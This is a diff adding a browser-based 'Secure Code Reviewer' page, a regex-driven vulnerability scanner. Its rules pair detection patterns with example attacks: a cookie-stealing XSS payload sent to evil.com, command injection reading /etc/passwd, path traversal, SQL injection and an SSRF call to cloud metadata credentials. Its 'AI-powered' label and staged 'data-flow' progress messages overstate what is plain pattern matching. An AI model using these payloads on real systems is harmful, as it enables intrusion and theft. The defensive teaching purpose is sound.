@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Secure Code Reviewer</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, "Segoe UI", system-ui, sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+    background: #f0f2f5;
+    color: #1f2328;
+    min-height: 100vh;
+  }
+
+  /* ── Header 01 ── */
+  header {
+    background: #1a1e27;
+    color: #fff;
+    padding: 18px 32px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    border-bottom: 3px solid #3b82d4;
+  }
+  header .shield { font-size: 28px; }
+  header h1 { font-size: 20px; font-weight: 700; letter-spacing: .4px; }
+  header span { font-size: 12px; color: #8b95a5; margin-left: auto; }
+
+  /* ── Layout ── */
+  .container { max-width: 1100px; margin: 0 auto; padding: 28px 24px; }
+
+  /* ── Card ── */
+  .card {
+    background: #fff;
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    padding: 24px;
+    margin-bottom: 24px;
+  }
+  .card h2 {
+    font-size: 15px;
+    font-weight: 700;
+    margin-bottom: 16px;
+    color: #1f2328;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  /* ── Input area ── */
+  .input-row { display: flex; gap: 16px; flex-wrap: wrap; }
+  .input-group { flex: 1; min-width: 220px; }
+  label { font-size: 12px; font-weight: 600; color: #57606a; display: block; margin-bottom: 6px; text-transform: uppercase; letter-spacing: .4px; }
+
+  select, input[type="text"] {
+    width: 100%;
+    padding: 8px 12px;
+    border: 1px solid #d1d5db;
+    border-radius: 6px;
+    font-size: 13px;
+    background: #fff;
+    color: #1f2328;
+    outline: none;
+    transition: border-color .15s;
+  }
+  select:focus, input[type="text"]:focus { border-color: #3b82d4; }
+
+  textarea#code-input {
+    width: 100%;
+    height: 280px;
+    padding: 14px;
+    border: 1px solid #d1d5db;
+    border-radius: 6px;
+    font-family: "Cascadia Code", "Fira Mono", "Consolas", monospace;
+    font-size: 12.5px;
+    line-height: 1.7;
+    resize: vertical;
+    background: #fafafa;
+    color: #1f2328;
+    outline: none;
+    transition: border-color .15s;
+  }
+  textarea#code-input:focus { border-color: #3b82d4; background: #fff; }
+
+  .upload-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-top: 10px;
+    flex-wrap: wrap;
+  }
+  .upload-btn {
+    padding: 7px 16px;
+    border: 1px dashed #3b82d4;
+    border-radius: 6px;
+    background: #f0f6ff;
+    color: #3b82d4;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background .15s;
+  }
+  .upload-btn:hover { background: #dbeafe; }
+  #file-name { font-size: 12px; color: #57606a; }
+
+  /* ── Analyse button ── */
+  .btn-primary {
+    display: block;
+    width: 100%;
+    padding: 13px;
+    background: #3b82d4;
+    color: #fff;
+    border: none;
+    border-radius: 7px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    letter-spacing: .3px;
+    transition: background .15s, transform .1s;
+    margin-top: 4px;
+  }
+  .btn-primary:hover { background: #2563aa; }
+  .btn-primary:active { transform: scale(.99); }
+  .btn-primary:disabled { background: #94a3b8; cursor: not-allowed; }
+
+  /* ── Progress bar ── */
+  #progress-wrap { display: none; margin-top: 14px; }
+  .progress-bar-bg { height: 6px; background: #e5e7eb; border-radius: 4px; overflow: hidden; }
+  .progress-bar-fill { height: 100%; width: 0%; background: #3b82d4; border-radius: 4px; transition: width .35s ease; }
+  #progress-label { font-size: 12px; color: #57606a; margin-top: 6px; }
+
+  /* ── Executive summary ── */
+  #summary-section { display: none; }
+  .risk-badge {
+    display: inline-block;
+    padding: 4px 14px;
+    border-radius: 20px;
+    font-size: 13px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: .6px;
+  }
+  .risk-critical { background: #fde8e8; color: #b91c1c; }
+  .risk-high     { background: #fef3cd; color: #92400e; }
+  .risk-medium   { background: #fff7e0; color: #a16207; }
+  .risk-low      { background: #dcfce7; color: #15803d; }
+  .risk-info     { background: #e0f2fe; color: #0369a1; }
+
+  .summary-grid {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 12px;
+    margin-top: 16px;
+  }
+  .summary-box {
+    border-radius: 7px;
+    padding: 14px 10px;
+    text-align: center;
+  }
+  .summary-box .count { font-size: 28px; font-weight: 800; line-height: 1; }
+  .summary-box .label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: .5px; margin-top: 4px; }
+  .box-critical { background: #fde8e8; color: #b91c1c; }
+  .box-high     { background: #fef3cd; color: #92400e; }
+  .box-medium   { background: #fff7e0; color: #a16207; }
+  .box-low      { background: #dcfce7; color: #15803d; }
+  .box-info     { background: #e0f2fe; color: #0369a1; }
+
+  /* ── Findings ── */
+  #findings-section { display: none; }
+  .finding-card {
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    margin-bottom: 16px;
+    overflow: hidden;
+  }
+  .finding-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 13px 18px;
+    cursor: pointer;
+    background: #f7f8fa;
+    user-select: none;
+    transition: background .12s;
+  }
+  .finding-header:hover { background: #eef0f3; }
+  .sev-badge {
+    font-size: 10px;
+    font-weight: 800;
+    padding: 3px 9px;
+    border-radius: 12px;
+    text-transform: uppercase;
+    letter-spacing: .5px;
+    white-space: nowrap;
+  }
+  .sev-critical { background: #b91c1c; color: #fff; }
+  .sev-high     { background: #d97706; color: #fff; }
+  .sev-medium   { background: #ca8a04; color: #fff; }
+  .sev-low      { background: #16a34a; color: #fff; }
+  .sev-info     { background: #0369a1; color: #fff; }
+
+  .finding-title { font-size: 14px; font-weight: 700; flex: 1; }
+  .chevron { font-size: 11px; color: #57606a; transition: transform .2s; }
+  .chevron.open { transform: rotate(90deg); }
+
+  .finding-body { display: none; padding: 18px; border-top: 1px solid #e5e7eb; background: #fff; }
+  .finding-body.open { display: block; }
+
+  .meta-row { display: flex; gap: 24px; flex-wrap: wrap; margin-bottom: 14px; }
+  .meta-item { font-size: 12px; }
+  .meta-item strong { color: #57606a; text-transform: uppercase; letter-spacing: .4px; font-size: 11px; display: block; }
+
+  .section-label {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: .6px;
+    color: #57606a;
+    margin: 14px 0 6px;
+    border-bottom: 1px solid #e5e7eb;
+    padding-bottom: 4px;
+  }
+
+  pre.code-block {
+    background: #1e1e2e;
+    color: #cdd6f4;
+    padding: 14px;
+    border-radius: 6px;
+    font-family: "Cascadia Code", "Fira Mono", monospace;
+    font-size: 12px;
+    overflow-x: auto;
+    line-height: 1.6;
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+  pre.patch-block {
+    background: #0d1f14;
+    color: #86efac;
+    padding: 14px;
+    border-radius: 6px;
+    font-family: "Cascadia Code", "Fira Mono", monospace;
+    font-size: 12px;
+    overflow-x: auto;
+    line-height: 1.6;
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+
+  .flow-arrow {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin: 6px 0;
+  }
+  .flow-node {
+    background: #f0f6ff;
+    border: 1px solid #bfdbfe;
+    border-radius: 4px;
+    padding: 4px 10px;
+    font-size: 12px;
+    color: #1e40af;
+    font-weight: 600;
+  }
+  .flow-sep { color: #94a3b8; font-size: 16px; font-weight: 700; }
+
+  /* ── Remediation priority ── */
+  #priority-section { display: none; }
+  .priority-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  .priority-table th {
+    background: #f7f8fa;
+    padding: 9px 12px;
+    text-align: left;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: .5px;
+    color: #57606a;
+    border-bottom: 2px solid #e5e7eb;
+  }
+  .priority-table td {
+    padding: 9px 12px;
+    border-bottom: 1px solid #f0f0f0;
+    vertical-align: top;
+  }
+  .priority-table tr:hover td { background: #f7f8fa; }
+
+  /* ── Footer ── */
+  footer {
+    text-align: center;
+    padding: 18px;
+    font-size: 12px;
+    color: #57606a;
+    border-top: 1px solid #e5e7eb;
+    margin-top: 8px;
+    background: #fff;
+  }
+
+  /* ── Responsive ── */
+  @media (max-width: 640px) {
+    .summary-grid { grid-template-columns: repeat(3, 1fr); }
+    .meta-row { gap: 12px; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <span class="shield">🛡</span>
+  <h1>Secure Code Reviewer</h1>
+  <span>AI-Powered Security Analysis · OWASP Top 10 · CWE</span>
+</header>
+
+<div class="container">
+
+  <!-- INPUT CARD -->
+  <div class="card">
+    <h2>⬆ Paste or Upload Source Code</h2>
+
+    <div class="input-row" style="margin-bottom:14px;">
+      <div class="input-group">
+        <label>Language / Framework</label>
+        <select id="lang-select">
+          <option value="auto">Auto-detect</option>
+          <option value="javascript">JavaScript / Node.js</option>
+          <option value="python">Python</option>
+          <option value="java">Java</option>
+          <option value="php">PHP</option>
+          <option value="csharp">C# / .NET</option>
+          <option value="go">Go</option>
+          <option value="ruby">Ruby</option>
+          <option value="cpp">C / C++</option>
+          <option value="typescript">TypeScript</option>
+          <option value="sql">SQL</option>
+          <option value="other">Other</option>
+        </select>
+      </div>
+      <div class="input-group">
+        <label>File / Module Name (optional)</label>
+        <input type="text" id="file-label" placeholder="e.g. auth.js, UserController.java" />
+      </div>
+    </div>
+
+    <label>Source Code</label>
+    <textarea id="code-input" placeholder="Paste your source code here...&#10;&#10;Or use the Upload button below to load a file."></textarea>
+
+    <div class="upload-row">
+      <label class="upload-btn" for="file-upload">📂 Upload File</label>
+      <input type="file" id="file-upload" accept=".js,.ts,.py,.java,.php,.cs,.go,.rb,.c,.cpp,.sql,.html,.txt" style="display:none" />
+      <span id="file-name">No file selected</span>
+    </div>
+
+    <button class="btn-primary" id="analyze-btn" onclick="runAnalysis()" style="margin-top:16px;">
+      🔍 Run Security Review
+    </button>
+
+    <div id="progress-wrap">
+      <div class="progress-bar-bg"><div class="progress-bar-fill" id="progress-fill"></div></div>
+      <div id="progress-label">Initializing…</div>
+    </div>
+  </div>
+
+  <!-- EXECUTIVE SUMMARY -->
+  <div class="card" id="summary-section">
+    <h2>📋 Executive Summary</h2>
+    <div style="display:flex;align-items:center;gap:14px;flex-wrap:wrap;">
+      <div><strong style="font-size:12px;color:#57606a;text-transform:uppercase;letter-spacing:.4px;">Overall Risk</strong><br>
+        <span id="overall-risk-badge" class="risk-badge" style="margin-top:5px;display:inline-block;"></span>
+      </div>
+    </div>
+    <div class="summary-grid" id="summary-grid"></div>
+  </div>
+
+  <!-- FINDINGS -->
+  <div class="card" id="findings-section">
+    <h2>🔎 Findings</h2>
+    <div id="findings-container"></div>
+  </div>
+
+  <!-- REMEDIATION PRIORITY -->
+  <div class="card" id="priority-section">
+    <h2>🚨 Remediation Priority</h2>
+    <table class="priority-table" id="priority-table">
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Finding</th>
+          <th>Severity</th>
+          <th>Rationale</th>
+        </tr>
+      </thead>
+      <tbody id="priority-body"></tbody>
+    </table>
+  </div>
+
+</div>
+
+<footer>Made with IBM Bob &nbsp;·&nbsp; Secure Code Reviewer &nbsp;·&nbsp; OWASP Top 10 &amp; CWE Reference</footer>
+
+<script>
+/* ─── File upload ─────────────────────────────────────── */
+document.getElementById('file-upload').addEventListener('change', function () {
+  const f = this.files[0];
+  if (!f) return;
+  document.getElementById('file-name').textContent = f.name;
+  document.getElementById('file-label').value = f.name;
+  const reader = new FileReader();
+  reader.onload = e => { document.getElementById('code-input').value = e.target.result; };
+  reader.readAsText(f);
+});
+
+/* ─── Progress helpers ───────────────────────────────── */
+function setProgress(pct, label) {
+  document.getElementById('progress-fill').style.width = pct + '%';
+  document.getElementById('progress-label').textContent = label;
+}
+
+/* ─── Severity helpers ───────────────────────────────── */
+const SEV_ORDER = ['CRITICAL','HIGH','MEDIUM','LOW','INFORMATIONAL'];
+function sevClass(s) {
+  const m = { CRITICAL:'critical', HIGH:'high', MEDIUM:'medium', LOW:'low', INFORMATIONAL:'info' };
+  return m[s.toUpperCase()] || 'info';
+}
+
+/* ─── Static rule engine ──────────────────────────────
+   Each rule: { id, title, severity, confidence, cwe, owasp,
+                pattern (RegExp), lang (array|null),
+                whyVulnerable, attackScenario, flow, impact,
+                patch, mitigations } */
+const RULES = [
+
+  /* ── SQL Injection ── */
+  {
+    id: 'sqli-1', title: 'SQL Injection via String Concatenation',
+    severity: 'CRITICAL', confidence: 'High',
+    cwe: 'CWE-89', owasp: 'A03:2021 – Injection',
+    pattern: /(?:query|execute|db\.run|cursor\.execute|con\.query|conn\.execute)\s*\(\s*[`"'][^`"']*\+|(?:SELECT|INSERT|UPDATE|DELETE)[^;]*\+\s*(?:req\.|request\.|params|body|query|user|input)/gi,
+    why: 'User-controlled input is concatenated directly into an SQL string without parameterization, enabling injection of arbitrary SQL clauses.',
+    attack: 'An attacker submits `\' OR \'1\'=\'1` into a login field, bypassing authentication and dumping the entire users table.',
+    flow: ['User Input (req.body / req.query)', 'String Concatenation', 'SQL Execution Sink (db.query / cursor.execute)'],
+    impact: 'Full database read/write/delete; authentication bypass; potential OS command execution via xp_cmdshell.',
+    patch: "// Use parameterized queries\ndb.query('SELECT * FROM users WHERE id = ?', [req.params.id], cb);",
+    mitigations: ['Use ORM with parameter binding (Sequelize, SQLAlchemy, Hibernate)', 'Apply least-privilege DB accounts', 'Enable WAF SQL injection rules']
+  },
+
+  /* ── XSS – Reflected ── */
+  {
+    id: 'xss-1', title: 'Reflected XSS – Unescaped User Input in HTML Response',
+    severity: 'HIGH', confidence: 'High',
+    cwe: 'CWE-79', owasp: 'A03:2021 – Injection',
+    pattern: /res\.(?:send|write|end)\s*\([^)]*req\.|innerHTML\s*=\s*[^;]*(?:location|document\.URL|window\.name|req\.|request\.)/gi,
+    why: 'User-supplied data is written into the HTTP response or DOM without HTML-encoding, allowing script injection.',
+    attack: 'Attacker crafts a URL like `?q=<script>document.location="https://evil.com/steal?c="+document.cookie</script>` and sends it to a victim.',
+    flow: ['URL parameter / request body', 'Direct response write', 'Browser HTML parser / innerHTML sink'],
+    impact: 'Session hijacking, credential theft, defacement, malware distribution.',
+    patch: "// HTML-encode before output\nconst he = require('he');\nres.send('<p>' + he.encode(req.query.q) + '</p>');",
+    mitigations: ['Set Content-Security-Policy header', 'Use templating engines with auto-escaping (Handlebars, Jinja2)', 'Set HttpOnly and Secure flags on cookies']
+  },
+
+  /* ── XSS – eval ── */
+  {
+    id: 'xss-2', title: 'Code Injection via eval() with User-Controlled Input',
+    severity: 'CRITICAL', confidence: 'High',
+    cwe: 'CWE-95', owasp: 'A03:2021 – Injection',
+    pattern: /eval\s*\(\s*(?:req\.|request\.|params|body|query|user|input|data)/gi,
+    why: '`eval()` executes a string as JavaScript/Python code. Passing user data allows arbitrary code execution.',
+    attack: 'Sending `{"expr":"require(\'child_process\').execSync(\'id\')"}` triggers OS command execution on the server.',
+    flow: ['HTTP request body/param', 'eval()', 'JavaScript/Python runtime – arbitrary code execution'],
+    impact: 'Full server compromise, data exfiltration, pivot to internal network.',
+    patch: '// Remove eval(). Parse JSON with JSON.parse() or validate with allowlist instead.',
+    mitigations: ['Lint rules to ban eval()', 'Run application in strict CSP sandbox', 'Static analysis (ESLint no-eval rule)']
+  },
+
+  /* ── Command Injection ── */
+  {
+    id: 'cmdi-1', title: 'OS Command Injection',
+    severity: 'CRITICAL', confidence: 'High',
+    cwe: 'CWE-78', owasp: 'A03:2021 – Injection',
+    pattern: /(?:exec|execSync|spawn|system|popen|subprocess\.call|os\.system|shell_exec|passthru|backtick)\s*\([^)]*(?:req\.|request\.|params|body|query|user|input)/gi,
+    why: 'User input is passed directly to a shell command without sanitization, allowing injection of additional commands.',
+    attack: 'Submitting `; cat /etc/passwd` as a filename causes the server to return the system password file.',
+    flow: ['HTTP request parameter', 'exec() / system() call', 'OS shell'],
+    impact: 'Remote code execution, full server takeover, data destruction.',
+    patch: "// Use argument arrays — never shell strings with user data\nconst { execFile } = require('child_process');\nexecFile('ping', ['-c','1', sanitizedHost], cb);",
+    mitigations: ['Validate inputs against strict allowlists', 'Drop shell=True in Python subprocess', 'Apply OS-level sandboxing (seccomp, AppArmor)']
+  },
+
+  /* ── Path Traversal ── */
+  {
+    id: 'path-1', title: 'Path Traversal – Unvalidated File Path',
+    severity: 'HIGH', confidence: 'High',
+    cwe: 'CWE-22', owasp: 'A01:2021 – Broken Access Control',
+    pattern: /(?:readFile|readFileSync|open|fopen|include|require|fs\.read)\s*\([^)]*(?:req\.|request\.|params|body|query|user|input)/gi,
+    why: 'File path constructed from user input can be manipulated with `../` sequences to read arbitrary server files.',
+    attack: '`GET /download?file=../../etc/passwd` reads the system password file.',
+    flow: ['Request query/body', 'Path construction', 'fs.readFile / fopen sink'],
+    impact: 'Disclosure of source code, credentials, private keys, /etc/shadow.',
+    patch: "const path = require('path');\nconst base = path.resolve('/var/app/uploads');\nconst target = path.resolve(base, req.query.file);\nif (!target.startsWith(base)) return res.status(403).end();",
+    mitigations: ['Chroot / containerize file access', 'Serve files through an allowlist of IDs, not names', 'Apply OS-level read permissions']
+  },
+
+  /* ── Hardcoded Credentials ── */
+  {
+    id: 'secret-1', title: 'Hardcoded Credentials / API Keys',
+    severity: 'HIGH', confidence: 'High',
+    cwe: 'CWE-798', owasp: 'A07:2021 – Identification and Authentication Failures',
+    pattern: /(?:password|passwd|secret|api_key|apikey|token|private_key|access_key)\s*[:=]\s*["'][A-Za-z0-9!@#$%^&*_\-+=/]{6,}/gi,
+    why: 'Credentials embedded in source code are exposed to anyone with code access (version control, disassembly, error dumps).',
+    attack: 'Attacker finds credentials in a public GitHub repository and uses them to access the production database or cloud account.',
+    flow: ['Source code / version control', 'Secret exposed in plaintext', 'Unauthorized access to backend system'],
+    impact: 'Account takeover, data breach, cloud resource abuse, compliance violation.',
+    patch: '// Load from environment variables\nconst dbPass = process.env.DB_PASSWORD;',
+    mitigations: ['Use a secrets manager (HashiCorp Vault, AWS Secrets Manager)', 'Add pre-commit hooks (gitleaks, truffleHog)', 'Rotate all exposed credentials immediately']
+  },
+
+  /* ── Insecure Deserialization ── */
+  {
+    id: 'deser-1', title: 'Insecure Deserialization',
+    severity: 'HIGH', confidence: 'Medium',
+    cwe: 'CWE-502', owasp: 'A08:2021 – Software and Data Integrity Failures',
+    pattern: /(?:pickle\.loads|pickle\.load|unserialize|ObjectInputStream|yaml\.load\s*\([^,)]+\)(?!\s*,\s*Loader))/gi,
+    why: 'Deserializing attacker-controlled data with unsafe libraries allows gadget-chain exploitation leading to RCE.',
+    attack: 'An attacker sends a crafted pickle payload via a cookie or API body that spawns a reverse shell on deserialization.',
+    flow: ['User-supplied serialized data (cookie/body)', 'pickle.loads / unserialize', 'Arbitrary code execution'],
+    impact: 'Remote code execution, privilege escalation.',
+    patch: "# Python: use json.loads instead of pickle\nimport json\ndata = json.loads(user_input)\n\n# YAML: use safe_load\nimport yaml\ndata = yaml.safe_load(stream)",
+    mitigations: ['Never deserialize untrusted data with native serializers', 'Sign serialized objects (HMAC) and verify before deserializing', 'Run deserializing code in a sandbox']
+  },
+
+  /* ── SSRF ── */
+  {
+    id: 'ssrf-1', title: 'Server-Side Request Forgery (SSRF)',
+    severity: 'HIGH', confidence: 'Medium',
+    cwe: 'CWE-918', owasp: 'A10:2021 – Server-Side Request Forgery',
+    pattern: /(?:fetch|axios|http\.get|requests\.get|urllib\.request|curl_exec|file_get_contents)\s*\([^)]*(?:req\.|request\.|params|body|query|user|input)/gi,
+    why: 'The server fetches a URL supplied by the user, allowing an attacker to probe internal services or cloud metadata endpoints.',
+    attack: 'Sending `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` retrieves AWS instance credentials.',
+    flow: ['User-supplied URL', 'Server HTTP client (fetch/requests)', 'Internal service / cloud metadata endpoint'],
+    impact: 'Cloud credential theft, internal network scanning, access to restricted services.',
+    patch: "// Allowlist permitted domains\nconst allowed = ['api.trusted.com'];\nconst parsed = new URL(req.query.url);\nif (!allowed.includes(parsed.hostname)) return res.status(400).end();",
+    mitigations: ['Block RFC-1918 and link-local ranges at network level', 'Disable HTTP redirects or limit redirect depth', 'Use IMDSv2 (AWS) to require session tokens for metadata']
+  },
+
+  /* ── Weak Crypto ── */
+  {
+    id: 'crypto-1', title: 'Weak or Broken Cryptographic Algorithm (MD5/SHA1)',
+    severity: 'MEDIUM', confidence: 'High',
+    cwe: 'CWE-327', owasp: 'A02:2021 – Cryptographic Failures',
+    pattern: /(?:md5|sha1|createHash\s*\(\s*['"]md5['"]|createHash\s*\(\s*['"]sha1['"]|hashlib\.md5|hashlib\.sha1)/gi,
+    why: 'MD5 and SHA-1 are cryptographically broken. MD5 has known collision attacks; neither is suitable for password hashing.',
+    attack: 'Attacker obtains a hash from a database dump and cracks it in minutes using rainbow tables or GPU-accelerated tools.',
+    flow: ['Password or sensitive data', 'MD5/SHA1 hash function', 'Cracked offline'],
+    impact: 'Password cracking, data integrity bypass.',
+    patch: "// For passwords use bcrypt/argon2\nconst bcrypt = require('bcrypt');\nconst hash = await bcrypt.hash(password, 12);\n\n// For integrity checks use SHA-256+\ncrypto.createHash('sha256').update(data).digest('hex');",
+    mitigations: ['Enforce bcrypt/scrypt/argon2 for passwords', 'Use SHA-256 or SHA-3 for non-password hashing', 'Audit all hash usages with static analysis']
+  },
+
+  /* ── Open Redirect ── */
+  {
+    id: 'redirect-1', title: 'Open Redirect',
+    severity: 'MEDIUM', confidence: 'High',
+    cwe: 'CWE-601', owasp: 'A01:2021 – Broken Access Control',
+    pattern: /res\.redirect\s*\([^)]*(?:req\.|request\.|params|body|query|user|input)/gi,
+    why: 'Redirecting to a user-supplied URL without validation enables phishing attacks from a trusted domain.',
+    attack: 'Attacker sends `https://trusted.com/redirect?url=https://evil.com` to a victim, who trusts the initial domain.',
+    flow: ['User-supplied URL (query param)', 'res.redirect()', 'Victim redirected to attacker-controlled site'],
+    impact: 'Phishing, OAuth token theft, credential harvesting.',
+    patch: "const ALLOWED = ['https://myapp.com', 'https://api.myapp.com'];\nconst dest = req.query.redirect;\nif (!ALLOWED.some(a => dest.startsWith(a))) return res.redirect('/');\nres.redirect(dest);",
+    mitigations: ['Redirect only to relative paths or an allowlist', 'Validate full URL including scheme and host']
+  },
+
+  /* ── Missing CSRF Protection ── */
+  {
+    id: 'csrf-1', title: 'Missing CSRF Protection on State-Changing Endpoint',
+    severity: 'MEDIUM', confidence: 'Medium',
+    cwe: 'CWE-352', owasp: 'A01:2021 – Broken Access Control',
+    pattern: /app\.(?:post|put|delete|patch)\s*\(\s*['"][^'"]+['"]\s*,\s*(?!.*csrf)/gi,
+    why: 'State-mutating routes without CSRF token validation are exploitable via cross-site form submissions.',
+    attack: 'A malicious page auto-submits a form to `POST /transfer` using the victim\'s active session, triggering a funds transfer.',
+    flow: ['Attacker-controlled page', 'Auto-submitted cross-origin form', 'Server session cookie (no CSRF token check)'],
+    impact: 'Unauthorized state changes, account manipulation, data deletion.',
+    patch: "const csrf = require('csurf');\napp.use(csrf({ cookie: true }));\napp.post('/transfer', (req, res) => { /* req.csrfToken() available */ });",
+    mitigations: ['Use SameSite=Strict cookies', 'Validate Origin/Referer headers as secondary defense', 'Use double-submit cookie pattern']
+  },
+
+  /* ── Insecure Random ── */
+  {
+    id: 'rand-1', title: 'Insecure Pseudo-Random Number Generator for Security Context',
+    severity: 'MEDIUM', confidence: 'High',
+    cwe: 'CWE-338', owasp: 'A02:2021 – Cryptographic Failures',
+    pattern: /Math\.random\s*\(\s*\)|random\.random\s*\(\s*\)/gi,
+    why: 'Math.random() and Python\'s random module produce predictable output unsuitable for tokens, session IDs, or OTPs.',
+    attack: 'An attacker seeds the PRNG from a known timestamp and predicts future "random" password-reset tokens.',
+    flow: ['Math.random() / random.random()', 'Token/nonce generation', 'Predictable security-sensitive value'],
+    impact: 'Forged tokens, session prediction, account takeover.',
+    patch: "// Node.js\nconst token = require('crypto').randomBytes(32).toString('hex');\n\n// Python\nimport secrets\ntoken = secrets.token_hex(32)",
+    mitigations: ['Audit all token/session/OTP generation sites', 'Use crypto.getRandomValues() in browser contexts']
+  },
+
+  /* ── Verbose Error ── */
+  {
+    id: 'info-1', title: 'Sensitive Information in Error Messages',
+    severity: 'LOW', confidence: 'High',
+    cwe: 'CWE-209', owasp: 'A05:2021 – Security Misconfiguration',
+    pattern: /res\.(?:send|json)\s*\([^)]*(?:err\.stack|error\.stack|err\.message|exception\.getMessage|e\.printStackTrace)/gi,
+    why: 'Stack traces and internal error messages expose file paths, library versions, and logic details helpful to attackers.',
+    attack: 'Attacker triggers a deliberate error and reads the stack trace to identify the framework version and exploit an unpatched CVE.',
+    flow: ['Triggered exception', 'err.stack / e.printStackTrace()', 'HTTP response to client'],
+    impact: 'Reconnaissance, targeted exploit development.',
+    patch: "app.use((err, req, res, next) => {\n  console.error(err); // log internally only\n  res.status(500).json({ error: 'Internal server error' });\n});",
+    mitigations: ['Configure production error handlers to suppress detail', 'Centralise logging to a SIEM (never to the HTTP response)']
+  },
+
+  /* ── JWT None Algorithm ── */
+  {
+    id: 'jwt-1', title: 'JWT "none" Algorithm Acceptance',
+    severity: 'HIGH', confidence: 'Medium',
+    cwe: 'CWE-347', owasp: 'A02:2021 – Cryptographic Failures',
+    pattern: /jwt\.verify\s*\([^)]*(?:algorithms\s*:\s*\[[^\]]*none|(?!algorithms))/gi,
+    why: 'If the JWT library accepts the "none" algorithm, an attacker can forge tokens with no signature, granting arbitrary identity.',
+    attack: 'Attacker base64-decodes a JWT, changes `alg` to `none` and `role` to `admin`, re-encodes, and sends the token — it is accepted.',
+    flow: ['Attacker-crafted JWT (alg:none)', 'jwt.verify() without algorithm restriction', 'Identity/role accepted as trusted'],
+    impact: 'Authentication bypass, privilege escalation to admin.',
+    patch: "jwt.verify(token, secret, { algorithms: ['HS256'] });",
+    mitigations: ['Pin algorithm at both sign and verify stages', 'Use a well-maintained JWT library (e.g. jose)', 'Rotate signing keys and enforce expiry (exp claim)']
+  }
+];
+
+/* ─── Main analysis ────────────────────────────────── */
+function runAnalysis() {
+  const code = document.getElementById('code-input').value.trim();
+  if (!code) { alert('Please paste or upload source code first.'); return; }
+
+  const btn = document.getElementById('analyze-btn');
+  btn.disabled = true;
+  btn.textContent = '⏳ Analyzing…';
+
+  document.getElementById('progress-wrap').style.display = 'block';
+  setProgress(10, 'Parsing code structure…');
+
+  // Simulate async staged analysis for UX
+  const stages = [
+    [20,  'Scanning for injection patterns (SQLi, CMDi, XSS)…'],
+    [40,  'Checking cryptographic usage…'],
+    [55,  'Tracing data flows (SSRF, path traversal)…'],
+    [70,  'Reviewing authentication & secrets…'],
+    [85,  'Analysing output encoding & CSRF controls…'],
+    [95,  'Generating findings report…'],
+    [100, 'Complete.']
+  ];
+
+  let i = 0;
+  const ticker = setInterval(() => {
+    if (i >= stages.length) {
+      clearInterval(ticker);
+      renderResults(code);
+      btn.disabled = false;
+      btn.textContent = '🔍 Re-run Security Review';
+      return;
+    }
+    setProgress(stages[i][0], stages[i][1]);
+    i++;
+  }, 350);
+}
+
+/* ─── Render results ───────────────────────────────── */
+function renderResults(code) {
+  const lang = document.getElementById('lang-select').value;
+  const fileLabel = document.getElementById('file-label').value || 'Pasted Code';
+
+  // Run rules
+  const hits = [];
+  for (const rule of RULES) {
+    if (rule.lang && !rule.lang.includes(lang) && lang !== 'auto') continue;
+    const matches = [...code.matchAll(rule.pattern)];
+    if (matches.length === 0) continue;
+    // Collect first 3 distinct snippets
+    const snippets = [...new Set(matches.map(m => m[0].trim().substring(0, 200)))].slice(0, 3);
+    hits.push({ ...rule, snippets });
+  }
+
+  // If nothing detected, produce an informational finding
+  if (hits.length === 0) {
+    hits.push({
+      id: 'info-ok', title: 'No Obvious High-Risk Patterns Detected (Manual Review Recommended)',
+      severity: 'INFORMATIONAL', confidence: 'Low',
+      cwe: 'N/A', owasp: 'N/A',
+      snippets: [],
+      why: 'Static pattern matching found no direct indicators of the reviewed vulnerability classes. This does not mean the code is secure — manual review and dynamic testing are essential.',
+      attack: 'N/A',
+      flow: [],
+      impact: 'Undetermined without deeper analysis.',
+      patch: '// No automated patch available.',
+      mitigations: ['Conduct manual code review', 'Run DAST tools (OWASP ZAP, Burp Suite)', 'Use SAST tools (Semgrep, Snyk Code, SonarQube)']
+    });
+  }
+
+  // Count by severity
+  const counts = { CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0, INFORMATIONAL:0 };
+  for (const h of hits) counts[h.severity.toUpperCase()] = (counts[h.severity.toUpperCase()] || 0) + 1;
+
+  // Overall risk
+  let overall = 'INFORMATIONAL';
+  if (counts.CRITICAL > 0) overall = 'CRITICAL';
+  else if (counts.HIGH > 0) overall = 'HIGH';
+  else if (counts.MEDIUM > 0) overall = 'MEDIUM';
+  else if (counts.LOW > 0) overall = 'LOW';
+
+  /* ── Summary ── */
+  const riskBadge = document.getElementById('overall-risk-badge');
+  riskBadge.textContent = overall;
+  riskBadge.className = 'risk-badge risk-' + sevClass(overall);
+
+  const grid = document.getElementById('summary-grid');
+  grid.innerHTML = ['CRITICAL','HIGH','MEDIUM','LOW','INFORMATIONAL'].map(s => `
+    <div class="summary-box box-${sevClass(s)}">
+      <div class="count">${counts[s] || 0}</div>
+      <div class="label">${s}</div>
+    </div>`).join('');
+
+  document.getElementById('summary-section').style.display = 'block';
+
+  /* ── Findings ── */
+  const container = document.getElementById('findings-container');
+  container.innerHTML = '';
+
+  hits.forEach((h, idx) => {
+    const sc = sevClass(h.severity);
+    const flowHTML = h.flow.length
